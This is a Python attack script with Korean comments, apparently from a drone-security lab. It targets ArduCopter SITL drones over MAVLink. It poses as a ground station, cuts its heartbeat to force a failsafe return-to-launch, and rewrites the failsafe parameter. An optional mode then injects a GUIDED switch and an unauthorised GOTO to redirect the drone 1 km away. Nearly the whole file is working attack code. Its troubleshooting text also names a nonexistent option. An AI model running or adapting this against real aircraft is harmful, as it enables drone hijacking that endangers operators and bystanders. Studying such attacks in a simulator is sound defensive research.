#!/usr/bin/env python3
"""§3.4 통신 두절 공격: GCS Heartbeat 차단으로 드론 Failsafe RTL 유도.

공격 흐름:
  1. SITL에 GCS로 연결, Heartbeat 전송 (드론이 GCS 존재 인식)
  2. Heartbeat 중단 → ArduCopter Failsafe 발동 대기
  3. RTL 전환 타이밍 측정
  4. (선택) RTL 복귀 중 추가 명령 주입 --reattack

실험 순서:
  1. GCS 화면에서 드론을 GUIDED 모드로 ARM + TAKEOFF
  2. python scripts/attack_blackout.py --drone drone-01
  3. GCS 화면에서 드론이 자동으로 RTL 전환되는 것 확인
  4. Wireshark: HEARTBEAT(msg_id=0) 패킷 빈도가 0이 되는 시점 확인

주의:
  ArduCopter Failsafe는 드론이 Armed 상태일 때만 발동한다.
  Disarmed 상태에서는 RTL 전환이 없으며 "GCS Failsafe On" STATUSTEXT만 출력된다.
"""
import argparse
import sys
import threading
import time
from pymavlink import mavutil

DRONE_PORTS = {"drone-01": 25760, "drone-02": 25770, "drone-03": 25780}
SITL_HOST   = "192.168.56.101"

COPTER_MODES = {0:"STABILIZE",3:"AUTO",4:"GUIDED",5:"LOITER",6:"RTL",9:"LAND"}
ACK_RESULTS  = {0:"ACCEPTED",1:"TEMPORARILY_REJECTED",2:"DENIED",3:"UNSUPPORTED",4:"FAILED",5:"IN_PROGRESS"}


# ── 연결 ──────────────────────────────────────────────────────────────────────

def connect(drone_id: str) -> mavutil.mavfile:
    port = DRONE_PORTS[drone_id]
    print(f"[CONNECT] {drone_id} @ {SITL_HOST}:{port}")
    conn = mavutil.mavlink_connection(
        f"tcp:{SITL_HOST}:{port}",
        source_system=255,
        source_component=0,
    )
    hb = conn.wait_heartbeat(timeout=10)
    if hb is None:
        print("[ERROR]   HEARTBEAT 타임아웃 — SITL 미실행 또는 포트 불일치")
        sys.exit(1)

    mode_num  = hb.custom_mode
    armed     = bool(hb.base_mode & 0x80)
    mode_name = COPTER_MODES.get(mode_num, f"MODE_{mode_num}")
    print(f"[READY]   sysid={conn.target_system}  mode={mode_name}({mode_num})  armed={armed}")
    conn.target_component = 1
    return conn


# ── Failsafe 파라미터 설정 ─────────────────────────────────────────────────────

def ensure_failsafe_enabled(conn: mavutil.mavfile) -> None:
    """FS_GCS_ENABLE=1 (RTL) 설정 — 이미 설정된 경우 스킵."""
    ts = conn.target_system

    # 현재 값 조회
    conn.mav.param_request_read_send(ts, 1, b"FS_GCS_ENABLE", -1)
    msg = conn.recv_match(type="PARAM_VALUE", blocking=True, timeout=5)
    if msg is None:
        print("[PARAM]   FS_GCS_ENABLE 조회 실패 — 계속 진행")
        return

    current = int(msg.param_value)
    print(f"[PARAM]   FS_GCS_ENABLE 현재값 = {current}", end="")

    if current == 1:
        print("  (RTL, OK)")
        return

    # 1(RTL)로 설정
    conn.mav.param_set_send(
        ts, 1,
        b"FS_GCS_ENABLE",
        1.0,
        mavutil.mavlink.MAV_PARAM_TYPE_INT8,
    )
    ack = conn.recv_match(type="PARAM_VALUE", blocking=True, timeout=5)
    if ack and int(ack.param_value) == 1:
        print(f"  → 1 (RTL) 설정 완료")
    else:
        print(f"  → 설정 실패 — 계속 진행")


# ── Heartbeat 전송 ─────────────────────────────────────────────────────────────

def _send_gcs_heartbeat(conn: mavutil.mavfile) -> None:
    conn.mav.heartbeat_send(
        mavutil.mavlink.MAV_TYPE_GCS,
        mavutil.mavlink.MAV_AUTOPILOT_INVALID,
        0,   # base_mode
        0,   # custom_mode
        mavutil.mavlink.MAV_STATE_ACTIVE,
    )


def heartbeat_loop(conn: mavutil.mavfile, stop_event: threading.Event,
                   interval: float = 1.0) -> None:
    """1Hz로 GCS Heartbeat 전송 (별도 스레드)."""
    count = 0
    while not stop_event.is_set():
        _send_gcs_heartbeat(conn)
        count += 1
        if count % 5 == 0:
            print(f"  [HB]    {count}번째 heartbeat 전송 중...")
        stop_event.wait(interval)


# ── 모드·이벤트 모니터 ──────────────────────────────────────────────────────────

def monitor_loop(conn: mavutil.mavfile, stop_event: threading.Event,
                 state: dict) -> None:
    """드론에서 오는 모든 메시지를 수신해 모드 변화·이벤트를 기록 (별도 스레드)."""
    while not stop_event.is_set():
        msg = conn.recv_match(blocking=True, timeout=0.5)
        if msg is None:
            continue
        mtype = msg.get_type()

        if mtype == "HEARTBEAT":
            mode_num  = msg.custom_mode
            armed     = bool(msg.base_mode & 0x80)
            mode_name = COPTER_MODES.get(mode_num, f"MODE_{mode_num}")

            prev = state.get("mode", "")
            if mode_name != prev:
                now = time.time()
                print(f"\n  [MODE]  {prev or '?'} → {mode_name}  armed={armed}")

                if mode_name == "RTL" and state.get("blackout_t") and not state.get("rtl_t"):
                    elapsed = now - state["blackout_t"]
                    print(f"  [★★★]  Failsafe RTL 발동!  차단 후 {elapsed:.1f}초 경과")
                    state["rtl_t"]       = now
                    state["rtl_elapsed"] = elapsed

                elif mode_name == "LAND" and state.get("rtl_t"):
                    elapsed = now - state["rtl_t"]
                    print(f"  [★]    RTL → LAND  RTL 시작 후 {elapsed:.1f}초")

                state["mode"]  = mode_name
                state["armed"] = armed

        elif mtype == "STATUSTEXT":
            text = msg.text.rstrip("\x00")
            sev  = {0:"EMERGENCY",1:"ALERT",2:"CRITICAL",3:"ERROR",
                    4:"WARNING",5:"NOTICE",6:"INFO",7:"DEBUG"}.get(msg.severity, str(msg.severity))
            print(f"  [STAT]  [{sev}] {text}")
            if "failsafe" in text.lower() or "gcs" in text.lower():
                print(f"          ↑ Failsafe 관련 메시지")

        elif mtype == "COMMAND_ACK":
            result_str = ACK_RESULTS.get(msg.result, f"RESULT_{msg.result}")
            print(f"  [ACK]   cmd={msg.command} → {result_str}")


# ── 재주입 공격 (RTL 복귀 중) ──────────────────────────────────────────────────

def reattack(conn: mavutil.mavfile) -> None:
    """RTL 복귀 중 추가 명령 주입."""
    ts = conn.target_system
    print(f"\n[REATTACK] RTL 감지 → 추가 공격 주입")

    # GUIDED 모드 전환 후 무단 GOTO
    conn.mav.set_mode_send(ts, 1, 4)  # GUIDED
    time.sleep(0.5)

    # 현재 위치에서 1km 이동 (위도 +0.009 ≈ 1km)
    lat_target = int((37.5665 + 0.009) * 1e7)
    lon_target = int(126.9780 * 1e7)
    conn.mav.set_position_target_global_int_send(
        0, ts, 1,
        mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
        0b0000111111111000,
        lat_target, lon_target, 30.0,
        0, 0, 0, 0, 0, 0, 0, 0,
    )
    print(f"[REATTACK] GUIDED 전환 + GOTO 주입 완료")
    print(f"[REATTACK] 목표: lat={lat_target/1e7:.6f}  lon={lon_target/1e7:.6f}  alt=30m")


# ── 메인 공격 시퀀스 ───────────────────────────────────────────────────────────

def blackout_attack(drone_id: str, warmup: int, watch: int,
                    do_reattack: bool, skip_param: bool) -> None:
    print(f"\n{'='*55}")
    print(f"  §3.4 통신 두절 공격")
    print(f"  대상: {drone_id}  워밍업: {warmup}s  관찰: {watch}s")
    print(f"{'='*55}\n")

    conn  = connect(drone_id)
    state = {"mode": "", "armed": False, "blackout_t": None,
             "rtl_t": None, "rtl_elapsed": None}

    # Failsafe 파라미터 확인
    if not skip_param:
        ensure_failsafe_enabled(conn)

    # 모니터 스레드 시작
    stop_monitor = threading.Event()
    monitor_t = threading.Thread(
        target=monitor_loop, args=(conn, stop_monitor, state), daemon=True
    )
    monitor_t.start()

    # ── STEP 1: Heartbeat 워밍업 ─────────────────────────────────────────────
    print(f"\n[STEP 1]  GCS Heartbeat 전송 ({warmup}초 워밍업)")
    print(f"          → 드론이 GCS 연결로 인식하는 시간 확보")
    stop_hb = threading.Event()
    hb_t = threading.Thread(
        target=heartbeat_loop, args=(conn, stop_hb), daemon=True
    )
    hb_t.start()
    time.sleep(warmup)

    # ── STEP 2: Heartbeat 차단 (공격 트리거) ─────────────────────────────────
    print(f"\n[STEP 2]  ★ Heartbeat 차단 — 공격 시작")
    blackout_start = time.time()
    state["blackout_t"] = blackout_start
    stop_hb.set()
    hb_t.join(timeout=2)
    print(f"          차단 시각: {time.strftime('%H:%M:%S')}")
    print(f"          ArduCopter Failsafe 기본 타임아웃: 5초")

    # ── STEP 3: Failsafe 관찰 ─────────────────────────────────────────────────
    print(f"\n[STEP 3]  Failsafe 관찰 ({watch}초)...\n")
    deadline = time.time() + watch
    reattacked = False

    while time.time() < deadline:
        # RTL 감지 → 재주입 공격
        if do_reattack and state.get("rtl_t") and not reattacked:
            reattacked = True
            time.sleep(2)  # RTL 안정화 후
            reattack(conn)

        # 착륙 완료(DISARM) 감지 → 조기 종료
        if not state.get("armed") and state.get("rtl_t"):
            print(f"\n[WATCH]   드론 착륙·Disarm 감지 → 조기 종료")
            break

        time.sleep(0.5)

    # ── 종료 ─────────────────────────────────────────────────────────────────
    stop_monitor.set()
    conn.close()

    # 결과 출력
    print(f"\n{'='*55}")
    print(f"  결과 요약")
    print(f"{'='*55}")
    if state.get("rtl_elapsed") is not None:
        print(f"  ✔ Failsafe RTL 전환: 차단 후 {state['rtl_elapsed']:.1f}초")
        print(f"  ✔ 공격 성공 — 드론이 홈으로 복귀 중")
    else:
        print(f"  ✗ RTL 전환 미감지")
        print(f"    가능한 원인:")
        print(f"    1. 드론이 Disarmed 상태 → Armed 후 재시도")
        print(f"    2. FS_GCS_ENABLE=0 → --no-skip-param 옵션으로 재시도")
        print(f"    3. 워밍업 시간 부족 → --warmup 15 이상으로 재시도")
    print(f"\n  [확인] → http://{SITL_HOST}:8000/gcs/")
    print(f"{'='*55}\n")


# ── 메인 ──────────────────────────────────────────────────────────────────────

def main() -> None:
    ap = argparse.ArgumentParser(
        description="§3.4 통신 두절 공격: GCS Heartbeat 차단으로 Failsafe RTL 유도"
    )
    ap.add_argument("--drone", required=True, choices=list(DRONE_PORTS),
                    help="공격 대상 드론 ID")
    ap.add_argument("--warmup", type=int, default=10,
                    help="Heartbeat 전송 워밍업 시간(초) — 드론이 GCS 인식하는 시간 (기본: 10)")
    ap.add_argument("--watch", type=int, default=30,
                    help="차단 후 Failsafe 관찰 시간(초) (기본: 30)")
    ap.add_argument("--reattack", action="store_true",
                    help="RTL 복귀 중 추가 명령 주입 시도 (연계 공격)")
    ap.add_argument("--skip-param", action="store_true",
                    help="FS_GCS_ENABLE 파라미터 설정 건너뜀")
    args = ap.parse_args()

    blackout_attack(
        drone_id    = args.drone,
        warmup      = args.warmup,
        watch       = args.watch,
        do_reattack = args.reattack,
        skip_param  = args.skip_param,
    )


if __name__ == "__main__":
    main()
